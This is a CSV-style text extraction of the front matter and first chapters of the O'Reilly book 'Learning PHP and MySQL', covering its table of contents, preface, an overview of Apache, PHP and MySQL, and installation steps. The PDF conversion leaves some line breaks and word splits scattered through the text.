Larger Text,Smaller Text,Symbol
Learning PHP and MySQL,NA,NA
Other resources from O’Reilly,"Related titles
  
 Essential PHP Security
  
 MySQL Pocket Reference
  
 Learning PHP 5
  
 PHP Cookbook
 ™
  
 Learning MySQL
  
 PHP Hacks
 ™
  
 Mastering Regular
  
 Programming PHP
  
 Expressions
  
 Web Database Applications
  
 MySQL Cookbook
 ™
  
 with PHP and MySQL
  
 MySQL in a Nutshell
  
 oreilly.com
  
 oreilly.com
  is more than a complete catalog of O’Reilly books.
  
 You’ll also find links to news, events, articles, weblogs, sample 
  
 chapters, and code examples.
  
 oreillynet.com
  is the essential portal for developers interested 
 in 
  
 open and emerging technologies, including new platforms, 
 pro-
  
 gramming languages, and operating systems.
  
 Conferences
  
 O’Reilly brings diverse innovators together to nurture the ideas
  
 that spark revolutionary industries. We specialize in 
 document-
  
 ing the latest tools and systems, translating the innovator’s 
  
 knowledge into useful skills for those in the trenches. Visit
  
 con-
  
 ferences.oreilly.com
  for our upcoming events.
  
  
 Safari Bookshelf (
 safari.oreilly.com
 ) is the premier online 
 refer-ence library for programmers and IT professionals. 
 Conduct searches across more than 1,000 books. Subscribers 
 can zero in
  
 on answers to time-critical questions in a matter of seconds. 
  
 Read the books on your Bookshelf from cover to cover or sim-
  
 ply flip to the page you need. Try it today for free.",NA
SECOND ,NA,NA
EDITION ,NA,NA
Learning PHP and ,NA,NA
MySQL,NA,NA
Michele E. Davis and Jon A. Phillips,"Beijing
  •
  Cambridge
  •
  Farnham
  •
  Köln
  •
  Paris
  •
  Sebastopol
  •
  Taipei
  •
  Tokyo",NA
Table of Contents,NA,NA
Preface,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 ix,NA,NA
1. Dynamic Content and the Web,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 1,"HTTP and the Internet 
  
 PHP and MySQL’s Place in Web Development 
 The Components of a PHP Application 
  
 Integrating Many Sources of Information 
  
 Requesting Data from a Web Page
  
  1
  
  2
  
  4
  
  7
  
  11",NA
2. Installation,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 15,"Developing Locally
  
  15
  
 Working Remotely
  
  35",NA
3. Exploring PHP,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 39,"PHP and HTML Text
  
  39
  
 Coding Building Blocks
  
  43",NA
4. PHP Decision-Making,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 62,"Expressions
  
  62
  
 Operator Concepts
  
  64
  
 Conditionals
  
  71
  
 Looping
  
  77",NA
5. Functions,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 85,"Calling Functions 
  
 Defining Functions 
  
 Object-Oriented 
 Programming
  
  
 87
  
  
 89
  
  
 96
  
 v",NA
6. Arrays,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 107,"Array Fundamentals
  
  107",NA
7. Working with MySQL,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 122,"MySQL Database 
  
 Managing the Database 
  
 Using phpMyAdmin 
  
 Database Concepts 
  
 Structured Query Language
  
  
 122
  
  
 125
  
  
 126
  
  
 131
  
  
 132",NA
8. Database Best Practices,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 146,"Database Design
  
  146
  
 Backing Up and Restoring Data
  
  155
  
 Advanced SQL
  
  159",NA
9. Getting PHP to Talk to MySQL,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 179,"The Process
  
  180
  
 Querying the Database with PHP Functions
  
  180
  
 Using PEAR
  
  190",NA
10. Working with Forms,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 199,"Building a Form
  
  199
  
 Templates
  
  218",NA
11. Practical PHP,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 223,"String Functions
  
  223
  
 Date and Time Functions
  
  233
  
 File Manipulation
  
  238
  
 Calling System Calls
  
  249",NA
12. XHTML,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 251,"Why XHTML?
  
  253
  
 XHTML and XML Namespaces
  
  254
  
 XHTML Versions
  
  254
  
 Generating XHTML with PHP
  
  261",NA
13. Modifying MySQL Objects and PHP Data,. . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 263,"Changing Database Objects from PHP
  
  263
  
 Manipulating Table Data
  
  266
  
 Displaying Results with Embedded Links
  
  267
  
 vi
  
 |
  
 Table of Contents",NA
"14. Cookies, Sessions, and Access Control",. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 285,"Cookies
  
  285
  
 PHP and HTTP Authentication
  
  288
  
 Sessions
  
  294
  
 Using Auth_HTTP to Authenticate
  
  301",NA
15. Security,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 307,"Session Security
  
  316",NA
16. Validation and Error Handling,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 325,"Validating User Input with JavaScript
  
  325
  
 Pattern Matching
  
  329
  
 Redisplaying a Form After PHP Validation Fails
  
  333",NA
17. Sample Application,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 339,"Configuration File 
  
 Page Framework 
  
 Database 
  
 Displaying a Postings Summary 
  
 Displaying a Posting and Its Comments 
 Adding and Changing Posts 
  
 Adding and Changing Comments
  
  
 340
  
  
 340
  
  
 343
  
  
 346
  
  
 349
  
  
 352
  
  
 358",NA
18. Finishing Your Journey,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 366,"PHP Coding Standards 
  
 PEAR 
  
 Frameworks 
  
 Ajax 
  
 Wikis 
  
 Finding Help on the Web
  
  
 366
  
  
 371
  
  
 372
  
  
 373
  
  
 373
  
  
 373",NA
Appendix.    Solutions to Chapter Questions,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 377,NA,NA
Index,. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .,NA
 391,"Table of Contents
  
 |
  
 vii",NA
Preface,"1
  
 PHP and MySQL are a powerful combination that makes it easy to create web appli-
 cations. If you’ve been creating web pages but want to build more sophisticated 
 sites that can grow and interact with users, PHP and MySQL let you get started 
 easily and then build complex applications on those foundations.
  
 Our goal is to help you learn the ins and outs of PHP and MySQL and to save you 
 some of the “Why doesn’t that work?” moments that we’ve already been through. 
 We’ll show you what to watch for and how to fix these issues without pulling out 
 your hair.",NA
Audience,"This book is for people who want to know how to create dynamic web sites. That 
 could include graphic designers who are already working in an IT or advertising 
 firm creating static web sites, and who may need to move forward with coding 
 database-driven web sites. It might also include people who already know, say, 
 Flash develop-ment and HTML markup, but need to expand their repertoire of 
 skills to databases and programming.",NA
Assumptions This Book Makes,"This book assumes you understand how web browsers work and have a basic 
 under-standing of HTML. Some understanding of JavaScript may be useful (for 
 Chapter 16) but isn’t generally required.
  
 You might also be overqualified. If you already know how to create pages using 
 MySQL and PHP, then you’d probably be better off with a book that is more a refer-
 ence than a learning book, such as Paul Hudson’s
  PHP in a Nutshell
 , or Russell 
 Dyer’s
  MySQL in a Nutshell
 , both from O’Reilly.
  
 ix",NA
Organization of This Book,"This book starts out with an overview of how all of the pieces you’ll be working 
 with fit together. Because there are multiple languages and technologies that 
 interact to form dynamic web pages, it’s best to start with a solid understanding of 
 how the pieces work together. The PHP that you’ll learn works as an integration 
 package for dynamic web sites.
  
 Next, we’ll walk through installing the core software packages on your local com-
 puter. This book focuses on PHP and MySQL, but making this work also usually 
 requires the Apache web server. The PHP interpreter works with the web server 
 when processing dynamic content. Finally, you’ll install the MySQL database. Instal-
 lation is covered for PC, Mac, and Linux systems. You can also use a hosted Internet 
 service provider (ISP) account to develop your pages, if you don’t want to install 
 everything locally.
  
 Since PHP plays an important role in pulling everything together, we next explain 
 the basics of working with the PHP language. This includes language essentials such 
 as data types, program flow logic, and variables. Functions, arrays, and forms each 
 get their own chapter to fully explore them.
  
 Because you may be new to databases in general, we ease into MySQL by first 
 explaining concepts that apply to designing and using any relational database. Then 
 we give specific examples of using MySQL to interact with your data. Once you can 
 get data in and out of the database, you’ll need to work with PHP to integrate that 
 data into your dynamic content.
  
 Security and access control get their own chapters. While security may sound like a 
 dull subject, it’s still a huge issue if you store any private information on your web 
 page. We’ll guide you around several common security pitfalls.
  
 We also touch on how XHTML, the next generation of HTML, works with PHP and 
 your web sites.
  
 Finally, we close with sample applications that demonstrate how the technologies 
 work together to rapidly build workable, fast web sites. You’ll also be provided with 
 web sites and forums to gain additional information on the topics covered in the 
 book.",NA
Supporting Books,"Even if you feel you are ready for this book, you may want to explore some of the 
 technologies in greater depth than is possible here. The following list offers some 
 good places to start:
  
 •
  Run Your Own Web Server Using Linux & Apache
 , by Tony Steidler-Dennison 
  
 (SitePoint).
  
 •
  PHP in a Nutshell
 , First Edition, by Paul Hudson (O’Reilly).
  
 x
  
 |
  
 Preface",NA
Conventions Used in This Book,"The following font conventions are used in this book:
  
 Italic 
  
 Indicates pathnames, filenames, and program names; Internet addresses, such 
 as domain names and URLs; and new items where they are defined.
  
 Constant width 
  
 Indicates command lines; names and keywords in programs, including method 
 names, variable names, and class names; HTML element tags; values; and data-
 base engines.
  
 Constant width italic 
  
  
 Indicates text that should be replaced with user-supplied 
 values.
  
 Constant width bold 
  
 Indicates emphasis in program code lines and user input options that should be 
 typed verbatim.
  
  
  
 This icon signifies a tip, suggestion, or general note.
  
 This icon indicates a warning or caution.",NA
Using Code Examples,"This book is here to help you get your job done. In general, you can use the code in 
 this book in your programs and documentation. You do not need to contact O’Reilly 
 for permission unless you’re reproducing a significant portion of the code. For 
 exam-ple, writing a program that uses several chunks of code from this book does 
 not require permission. Selling or distributing a CD-ROM of examples from O’Reilly 
 books
  does
  require permission. Answering a question by citing this book and quot-
 ing example code does not require permission. Incorporating a significant amount 
 of example code from this book into your product’s documentation
  does
  require 
 permission.
  
 Preface
  
 |
  
 xi",NA
How to Contact Us,"We have tested and verified the information in this book to the best of our ability, 
 but mistakes and oversights do occur. Please let us know about any errors you find, 
 as well as your suggestions for future editions, by writing to:
  
 O’Reilly Media, Inc.
  
 1005 Gravenstein Highway North 
  
 Sebastopol, CA 95472 
  
 800-998-9938 (in the United States or 
 Canada) 
  
 707-829-0515 (international or local) 
  
 707-829-0104 (fax)
  
 We have a web page for this book, where we list errata, examples, and any addi-
 tional information. You can access this page at:
  
 http://www.oreilly.com/catalog/9780596514013
  
 There is also a blog for this book located at:
  
 http://www.krautgrrl.com/learningphp/
  
 To comment or ask technical questions about this book, send email to:
  
 bookquestions@oreilly.com
  
 For more information about our books, conferences, Resource Centers, and the 
 O’Reilly Network, see our web site at:
  
 http://www.oreilly.com",NA
Safari® Books Online,"When you see a Safari® Books Online icon on the cover of your 
 favorite technology book, that means the book is available online 
 through the O’Reilly Network Safari Bookshelf.
  
 Safari offers a solution that’s better than e-books. It’s a virtual library that lets you 
 easily search thousands of top tech books, cut and paste code samples, download 
 chapters, and find quick answers when you need the most accurate, current 
 informa-tion. Try it for free at
  http://safari.oreilly.com
 .
  
 xii
  
 |
  
 Preface",NA
Acknowledgments,"We are happy to have this newly improved and expanded Second Edition out for 
 our audience. We’d like to thank our wonderful agent, Matt Wagner of Fresh Books, 
 along with Simon St.Laurent at O’Reilly for getting this Second Edition rolling; with-
 out them, this book wouldn’t be in your hands.
  
 Second, profuse thanks to our technical editors, especially Jereme Allen, Charlie 
 Maguire, and Peter MacIntyre for their fantastic edits to our book. We’d also like to 
 thank our local Minneapolis/St. Paul PHP community:
  http://www.tcphp.org
 , which 
 sparked our interest in PHP and MySQL years ago. Lastly, thanks to Simon, Mimi, 
 and Zack for being patient while their parents reworked a very important book.
  
 Preface
  
 |
  
 xiii",NA
CHAPTER 1,NA,NA
Dynamic Content and the Web,"1
  
 To the average user, a web page is a web page. It opens in the browser and provides 
 information. Looking closer, though, some pages stay mostly the same, while other 
 pages change regularly. Pages that don’t change—
 static
  pages—are relatively 
 simple to create. Someone has to create an HTML document, by hand or with tools, 
 and upload it to a site where web browsers can visit. One of the most common tools 
 to create HTML documents is Adobe Dreamweaver. When changes are needed, you 
 just replace the old file with a new one.
  Dynamic
  pages are also built with HTML, 
 but instead of a simple build-and-post approach, the pages are updated regularly, 
 sometimes every time that they are requested.
  
 Static sites provide hyperlinked text and perhaps a login screen, but beyond that, 
 they 
 don’t 
 offer 
 much 
 interaction. 
 By 
 contrast, 
 Amazon.com 
 (
 http://www.amazon.com
 ) demonstrates much of what a dynamic web site can do: 
 your ordering data is logged, and Amazon offers recommendations based on your 
 purchasing history when you access their page. In other words, dynamic means 
 that the user interacts with the web site beyond just reading pages, and the web 
 site responds accordingly. Every page is a personalized experience.
  
 Creating dynamic web pages—even a few years ago—meant writing a lot of code in 
 the C or Perl languages, and then calling and executing those programs through a 
 process called a Common Gateway Interface (CGI). Having to create executable files 
 wasn’t much fun, and neither was learning a whole new complicated language.
  
 Thankfully, PHP and MySQL make creating dynamic web sites easier and faster.",NA
HTTP and the Internet,"Some basic understanding of how the Internet works may be useful if you haven’t 
 programmed for the Web before. The HyperText Transfer Protocol (HTTP) defines 
 how web pages are transferred across the Internet. HTTP is the method used to 
 transfer or convey information on the World Wide Web. Its original purpose was to 
 provide a way to publish and retrieve HTML pages.
  
 1",NA
PHP and MySQL’s Place in Web Development,"PHP is a programming language designed to generate web pages interactively on 
 the computer serving them, which is called a
  web server
 . Unlike HTML, where the 
 web browser uses tags and markup to generate a page, PHP code runs between the 
 requested page and the web server, adding to and changing the basic HTML output.
  
 PHP makes web development easy because all the code you need is contained 
 within the PHP framework. This means that there’s no reason for you to reinvent 
 the wheel each time you sit down to develop a PHP program; it comes with web 
 functionality built-in.
  
 While PHP is great for web application development, it doesn’t store information by 
 itself. For that, you need a database. The database of choice for PHP developers is 
 MySQL, which acts like a filing clerk for PHP-processed user information. MySQL 
 automates the most common tasks related to storing and retrieving specific user 
 information based on your supplied criteria.
  
  
 Consider the Amazon.com example: the recommendations Amazon 
 offers are based on a database that records your prior order 
 information.
  
 MySQL is easily accessed from PHP, and they work well together. An added benefit 
 is that PHP and MySQL run on various computer types and operating systems, 
 including Mac OS X, Windows-based PCs, and Linux.
  
 2
  
 |
  
 Chapter 1: Dynamic Content and the Web",NA
Advantages of Using PHP with MySQL,"There are several factors that make using PHP and MySQL together a natural choice:
  
 PHP and MySQL work well together 
  
 PHP and MySQL have been developed with each other in mind, so they are easy 
 to use together. The programming interfaces between them are logically paired 
 up. Working together wasn’t an afterthought when the developers created the 
 PHP and MySQL interfaces.
  
 PHP and MySQL have open source power 
  
 As they are both open source projects, PHP and MySQL can both be used for 
 free. MySQL client libraries are no longer bundled with PHP. Advanced users 
 have the ability to make changes to the source code, and therefore change the 
 way the language and programs work.
  
 PHP and MySQL have community support 
  
 Both tools active communities on the Web in which you can participate, and the 
 participants will help you answer your questions. You can also purchase profes-
 sional support for MySQL if you need it.
  
 PHP and MySQL are fast 
  
  
 Their simple and efficient designs enable faster 
 processing.
  
 PHP and MySQL don’t bog you down with unnecessary details 
  
 You don’t need to know all of the low-level details of how the PHP language 
 interfaces with the MySQL database, as there is a standard interface for calling 
 MySQL procedures from PHP. Online application programming interfaces (APIs) 
 at
  http://www.php.net
  offer unlimited resources.",NA
The Value of Open Source,"As we mentioned above, both PHP and MySQL are open source projects, so you 
 don’t need to worry about buying user licenses for every computer in your office or 
 home. When using open source projects and technologies, programmers have 
 access to the source code. This enables individual or group analysis to identify 
 potentially problematic code, test, debug, and offer changes as well as additions to 
 that code. For example, Unix—the forerunner in the open source software 
 community—was freely shared with university software researchers. Linux, the 
 free alternative to Unix, is a direct result of their efforts and the open source-
 licensing paradigm. Most open source licenses include the right to distribute 
 modified code with some restrictions. For example, some licenses require that 
 derivative code must also be released under the same license, or there may be a 
 restriction that others can’t use your code.
  
 As Tim O’Reilly puts it, “Open source licensing began as an attempt to preserve a 
 culture of sharing, and only later led to an expanded awareness of the value of that 
 sharing.” Today, open source programmers share their code changes on the Web 
 via 
 http://www.php.net
 , listservs, and web sites. If you’re caught in a coding 
 nightmare and can’t wake up, the resources mentioned previously can and will help 
 you.
  
 PHP and MySQL’s Place in Web Development
  
 |
  
 3",NA
The Components of a PHP Application,"In order to process and develop dynamic web pages, you’ll need to use and under-
 stand several technologies. There are three main components of creating dynamic 
 web pages: a web server, a server-side programming language, and a database. It’s 
 a good idea to have an understanding of these three basic components for web 
 devel-opment using PHP. We’ll start with some rudimentary understanding of the 
 history and purpose of Apache (your web server), PHP (your server-side 
 programming lan-guage), and MySQL (your database). This can help you to 
 understand how they fit into the web development picture.
  
 Remember that dynamic web pages pull information from several sources simulta-
 neously, including Apache, PHP, MySQL, and Cascading Style Sheets (CSS), which 
 we’ll talk about later.",NA
PHP,"PHP grew out of a need for people to develop and maintain web sites containing 
 dynamic client-server functionality. In 1994, Rasmus Lerdorf created a collection of 
 open source Perl scripts for his personal use, and these eventually were rewritten 
 in C and turned into what PHP is today. By 1998, PHP was released in its third 
 version, turning it into a web development tool that could compete with similar 
 products such as Microsoft’s Active Server Pages (ASP) and Sun’s Java Server Pages 
 (JSP). PHP also is an interpreted language, rather than a compiled one. The real 
 beauty of PHP is simplicity coupled with power.
  
  
 Compiled languages create a binary file such as an
  .exe
 , while inter-
 preted languages work directly with the source code when 
 executing, as opposed to creating a standalone file.
  
 PHP is ubiquitous and compatible with all major operating systems. It is also easy 
 to learn, making it an ideal tool for web programming beginners. Additionally, you 
 get to take advantage of a community’s effort to make web development easier for 
 every-one. The creators of PHP developed an infrastructure that allows 
 experienced C pro-grammers to extend PHP’s abilities. As a result, PHP now 
 integrates with advanced technologies like XML, XSL, and Microsoft’s Component 
 Object Model Technolo-gies (COM).
  
 4
  
 |
  
 Chapter 1: Dynamic Content and the Web",NA
Apache,"Apache is a web server that turns browser requests into resulting web pages and 
 knows how to process PHP code. PHP is only a programming language, so without 
 the power of a web server like Apache behind it, there would be no way for web 
 users to reach your pages containing the PHP language code.
  
 Apache is not the only web server available. Another popular web server is 
 Microsoft’s Internet Information Services (IIS), which is supplied with Windows 
 2000 and all later versions. Apache has the decided advantages of being free, 
 provid-ing full source code, and using an unrestricted license. Apache 2.0 is the 
 current ver-sion you would most likely be using, though 1.3 is often still used. IIS is 
 easier to integrate with Active Directory, Microsoft’s latest authentication system, 
 but this applies mostly to internal company web sites.
  
  
 According to the Netcraft web server survey, Apache has been the 
 most popular web server on the Internet since April 1996.
  
 Because web servers like Apache and IIS are designed to serve up HTML files, they 
 need a way to know how to process PHP code. Apache uses
  modules
  to load exten-
 sions into its functionality. IIS uses a similar concept called Internet Server Applica-
 tion Program Interface (ISAPI). These both allow for faster processing of the PHP 
 code than the old-school process of calling PHP as a separate executable each time 
 the web server had a request for a page containing PHP. We’ll discuss how the 
 Apache module is set up in Chapter 2.
  
 Apache has only two major versions in use today: 1.3 and 2. Apache 2 is a major 
 rewrite and supports
  threading
 . Threads allow a single process to manage more 
 than one thing at a time. This increases speed and reduces the resources needed. 
 Unfortu-nately, PHP isn’t totally compatible with threading yet. Apache 2 has been 
 out long enough to be considered stable for use in development and production 
 environ-ments.
  
 Apache 2 also supports more powerful modules. Some additional modules can be 
 found at
  http://www.cri.ensmp.fr/~coelho/mod_macro/
 . However, shared module 
 DLLs that don’t come with the official Apache source files, such as
  mod_php4
 ,
  mod_ 
 ssl
 ,
  mod_auth_mysql
 , and
  mod_auth_ntsec
 , can be found on the Web.
  
 Apache also has the advantage of being able to run on operating systems other than 
 Windows, which now brings us to the subject of compatibility. But first we’ll give 
 you a little more in-depth coverage of relational databases and SQL.
  
 The Components of a PHP Application
  
 |
  
 5",NA
SQL and Relational Databases,"Structured Query Language (SQL) is the most popular language used to create, 
 retrieve, update, and delete data from relational database management systems. A 
 relational
  database conforms to the relational model and refers to a database’s data 
 and schema. The
  schema
  is the database’s structure of how data is arranged. 
 Common usage of the term “Relational Database Management System” technically 
 refers to the software used to create a relational database, such as Oracle or 
 Microsoft SQL Server.
  
 A relational database is a collection of tables, but other items are frequently consid-
 ered part of the database, as they help organize and structure the data in addition 
 to forcing the database to conform to a set of requirements.",NA
MySQL,"MySQL is a free yet full-featured relational database. MySQL was developed in the 
 1990s to fill the ever-growing need for computers to manage information intelli-
 gently. The original core MySQL developers were trying to solve their needs for a 
 database by using mSQL, a small and simple database. It become clear that mSQL 
 couldn’t solve all the problems they wanted it to, so they created a more robust 
 data-base that turned into MySQL.
  
 MySQL supports several different
  database engines
 . Database engines determine 
 how MySQL handles the actual storage and querying of the data. Because of that, 
 each storage engine has its own set of abilities and strengths. Over time, the 
 database engines available are becoming more advanced and faster. Table 1-1 lists 
 when vari-ous features have been added to MySQL.
  
 Table 1-1. Major MySQL releases
  
 Version
  
 Features
  
 3.23
  
 The MyISAM database engine is added and is the default engine. It handles large 
 amounts of data efficiently.
  
 TheInnoDBdatabaseenginedebutsfortransactionsafedatabaseprocessingandsupp
 ortfor
 foreignkeys
 .Foreign keys allow the relationships between tables to be 
 explicitly designated in the database.
  
 4.0 
  
 Queries support
  unions
 . Unions allow merging the results of two queries into 
 one result. Configuration changes 
  
 can be made without restarting the database.
  
 4.1 
  
 A
  help
  command is included for the database client. There is support for
  
 unnamed views
 , also known as 
  
 subqueries
 . Unnamed views allow you to treat a query like 
 a separate table within a query. There is support for 
  
 Unicode character sets (local 
 languages).
  
 5.0 
  
 Database
  triggers
 ,
  stored procedures
 ,
  constraints
 , and
  cursors
  are added. A trigger 
 allows code to run in the data-
  
 base when a triggering event occurs, such as inserting data 
 into a table. Stored procedures allow programs to be 
  
 defined and executed within 
 the database. Constraints are used to define rules for when rows can be added or 
  
 modified in the database. Cursors allow code in the database to be run for each 
 row that matches a query.
  
 6
  
 |
  
 Chapter 1: Dynamic Content and the Web",NA
Compatibility,"Web browsers such as Safari, Firefox, Netscape, and Internet Explorer are made to 
 process HTML, so it doesn’t matter which operating system a web server runs on. 
 Apache, PHP, and MySQL support a wide range of operating systems (OS), so you 
 aren’t restricted to a specific OS on either the server or the client. While you don’t 
 have to worry much about software compatibility, the sheer variety of file formats 
 and different languages that all come together does take some getting used to.",NA
Integrating Many Sources of Information,"In the early days of the Web, life was simple. There were files that contained HTML, 
 and binary files such as images. Several technologies have since been developed to 
 organize the look of web pages. For example,
  Cascading Style Sheets
  (CSS) pull pre-
 sentation information out of your HTML and into a single spot so that you can make 
 formatting changes across an entire set of pages all at once; you don’t have to 
 manu-ally change your HTML markup one HTML page at a time.
  
 You can potentially have information coming from HTML files that reference CSS, 
 PHP templates, and a MySQL database all at once. PHP templates make it easier to
  
 Integrating Many Sources of Information
  
 |
  
 7",NA
Requesting Data from a Web Page,"It can be tricky to understand how all of these pieces integrate. When a web server 
 detects PHP code, it turns over the processing of the page to the PHP interpreter. 
 The server processes the PHP file and sends the resulting HTML file to the browser. 
 If that result includes an external CSS stylesheet, the browser issues a separate 
 request for that stylesheet before displaying the page.
  
 Requesting Data from a Web Page
  
 |
  
 11",NA
Chapter 1 Questions,"Question 1-1 
  
  
 What three components do you need to create a dynamic web 
 page?
  
 Question 1-2 
  
  
 What does Apache use to load 
 extensions?
  
 Question 1-3 
  
  
 What does SQL (as in MySQL) stand for?
  
 Question 1-4 
  
  
 What are angle brackets (
 <>
 ) used 
 for?
  
 Question 1-5 
  
  
 What does the PHP Interpreter do?
  
 See the “Chapter 1” section in the Appendix for the answers to these questions.
  
 14
  
 |
  
 Chapter 1: Dynamic Content and the Web",NA
CHAPTER 2,NA,NA
Installation,"2
  
 Developers working with PHP and MySQL often find it more convenient to work on 
 a local computer rather than a remote web server. In general, it is also safer to 
 create and test your applications on a local—preferably private—computer and 
 then deploy them to a public server where others can enjoy your work. Typically, 
 you need to install Apache, PHP, and MySQL on the local computer, while your ISP 
 handles installation on the public server.",NA
Developing Locally,"Developing your web applications on your local computer is a good way to learn, 
 because you can interact with all of the components on your own machine and not 
 risk causing problems on a production server. That way, if there are problems in 
 the local environment, you can fix them immediately without exposing them to 
 your site’s visitors. Working with local files means that you don’t have to FTP them 
 to a server, you don’t have to be connected to the Internet, and you know exactly 
 what’s installed, since you did it yourself.
  
 There are three components to install:
  
 • Apache
  
 • PHP
  
 • MySQL
  
 You need to install the programs in that order. All our examples will be from the 
 installation perspective of a PC with Windows installed, with notes for Macintosh 
 and Linux systems.
  
 15",NA
Bundled or Full Installations,"When just starting out, it can be easier to install a bundled set of Apache, MySQL, 
 phpMyAdmin, and PHP. There are several packages available that install all of these 
 at the same time as a single installer within one directory on your computer. These 
 packages also provide a control panel to start and stop individual components and 
 administer them. In other words, it’s a great way for a beginner to start out. The 
 downside is that they’re not meant for production use, as they are often configured 
 with minimal security to make them easier to use. We’ll discuss one of the more 
 popular packages, called XAMPP. First, we’ll discuss installing everything the old-
 fashioned way.",NA
Installing Apache,"Apache needs to be installed and operational before PHP and MySQL can be 
 installed, or else they won’t work correctly. Any computer can be turned into a web 
 server by installing server software and connecting the machine to the Internet, 
 which is why you need to install Apache. To keep the installation as simple as possi-
 ble, we’ll address only the latest versions of Apache, PHP, and MySQL. Although you 
 can use older versions, they’re more difficult to install and get to work together.
  
 1. Download the Apache 2.x Win32 MSI installer binary. It’s downloadable from 
 http://httpd.apache.org/
 . Select the “Download from a mirror” link on the left 
 side of the page and download the best available version. A
  mirror
  is a down-
 load location. The file that you save to your desktop will be named similarly to 
 apache_2.2.4-win32-x86-no_ssl.msi
  (the exact version number will vary).
  
  
 If you are on Mac OS X, you already have Apache installed. Open Sys-
 tem Preferences, select the Sharing panel, and click to activate Per-
 sonal Web Sharing (which is actually Apache). Mac OS X 10.2, 10.3, 
 and 10.4 all come with different versions of Apache, but each works
  
 perfectly fine.
  
 2. Install Apache using the Installation Wizard. Double-click the MSI installer file 
 on your desktop, and you see the installer shown in Figure 2-1.
  
 The Installation Wizard walks you through the installation process.
  
 16
  
 |
  
 Chapter 2: Installation",NA
Installing PHP,"Go to
  http://www.php.net/downloads.php
  to download the latest version of PHP; 
 both binaries and source code can be found on this web site. Under Windows 
 Binaries, select the PHP 5.x installer where x is the latest available version. Select a 
 mirror site in your country from the list of mirrors to download the file:
  
 1. The file that you save to your desktop will be named similarly to
  php-5.2.1-
 win32-installer.msi
  (the exact version number will vary).
  
 2. Install PHP using the Installation Wizard. Double-click the MSI installer file on 
 your desktop, and you’ll see the installer shown in Figure 2-9.
  
  
 Figure 2-9. The PHP MSI installer
  
 Developing Locally
  
 |
  
 21",NA
Installing MySQL 5.0,"The final component you need to develop and test pages on your local computer is 
 MySQL. Now you’ll download the MySQL Installer:
  
 1. Download the MySQL binaries. Both the binaries and the source code can be 
 found at
  http://dev.mysql.com/downloads/
 . Under MySQL Community Server, 
 click the Download button.
  
 2. Click Windows.
  
 3. Click the download link for Windows Essentials (x86). This file is a Windows 
 MSI installer.
  
 4. The link takes you to a page where you can either enter your personal info or 
 just click No Thanks to download the file. A number of download locations are 
 available; select one. Download the recommended latest version, currently 5.0. 
 Save the installer file to your desktop.
  
 5. Double-click the MSI installer file on your desktop. A setup wizard, shown in 
 Figure 2-17, walks you through the installation process. Click Next.
  
 Developing Locally
  
 |
  
 27",NA
XAMPP,"XAMPP is available for Windows, Linux, and newer Mac OS X systems (Intel-based, 
 OS X 10.4). XAMPP offers a simple, integrated approach to installing all the tools 
 you need on multiple platforms. The following steps cover installing XAMPP on 
 Windows, but the installation process is similar for all platforms:
  
 Developing Locally
  
 |
  
 33",NA
Working Remotely,"Although we recommend that you start out working locally, you can use an ISP 
 account as long as it supports PHP and MySQL.
  
 You need login information to the remote server, and you may need to use your 
 ISP’s web-based tool to create your database.
  
 To transfer your files and directories, you need to activate a File Transfer Protocol 
 (FTP) account at your ISP, usually through your account control panel. Once you 
 have an FTP login, upload your HTML and PHP files using an FTP client.
  
 Working Remotely
  
 |
  
 35",NA
Chapter 2 Questions,"Question 2-1 
  
  
 What three components must be installed to create a dynamic web site?
  
 Question 2-2 
  
  
 What OS has Apache installed already?
  
 Question 2-3 
  
  
 Where should you create a PHP directory for 
 downloads?
  
 Question 2-4 
  
  
 What does the hash (
 #
 ) sign mean?
  
 Question 2-5 
  
  
 How do you work remotely?
  
 Question 2-6 
  
  
 How do you transfer files to your ISP?
  
 Question 2-7 
  
  
 How must PHP files be accessed?
  
 See the “Chapter 2” section in the Appendix for the answers to these questions.
  
 38
  
 |
  
 Chapter 2: Installation",NA
CHAPTER 3,NA,NA
Exploring PHP,"3
  
 With PHP, MySQL, and Apache installed, you’re ready to begin writing code. Unlike 
 many languages, PHP doesn’t require complex tools such as compilers and debug-
 gers. In fact, you’ll soon see that you can enter PHP directly into your existing 
 HTML documents, and with just a few tweaks, you’ll be off and running.
  
 In this chapter, we’ll start by showing you how PHP handles simple text, and then 
 move on to basic decision-making. Some really cool things you can do include 
 show-ing an image based on the current user’s browser, and printing a warning 
 message if the user is browsing from an operating system that makes your web site 
 look crummy. All this and more is possible with PHP, which makes these tricks 
 simple.",NA
PHP and HTML Text,"It’s simple to output text using PHP; in fact, handling text is one of PHP’s special-
